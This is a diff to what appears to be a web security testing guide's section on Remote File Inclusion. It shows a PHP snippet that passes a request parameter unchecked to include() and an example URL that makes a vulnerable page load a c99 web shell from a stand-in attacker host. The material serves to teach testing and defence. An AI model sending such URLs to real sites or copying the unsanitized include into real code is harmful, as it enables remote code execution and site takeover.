@@ -55,11 +55,15 @@ Sensitive Information Disclosure
  
 Since RFI occurs when paths passed to "include" statements are not properly sanitized, in a blackbox testing approach, we should look for scripts which take filenames as parameters. Consider the following PHP example:  
 ```
-$incfile = $_REQUEST["file"];
-include($incfile.".php");
+	<?php
+	$incfile = $_REQUEST["file"];
+	include($incfile.".php");
+	?>
 ```
 In this example the path is extracted from the HTTP request and no input validation is done.
-```http://vulnerableWebSite.com/vulnPage.php?file=http://attackerSite/malicousURL```
+```
+[URL] http://vulnerableWebSite.com/vulnPage.php?file=http://attackerSite.com/c99.php
+```
 
 File Inclusion (RFI/LFI) mostly occurs from some functions that developers	do not properly check user supplied data.
 	
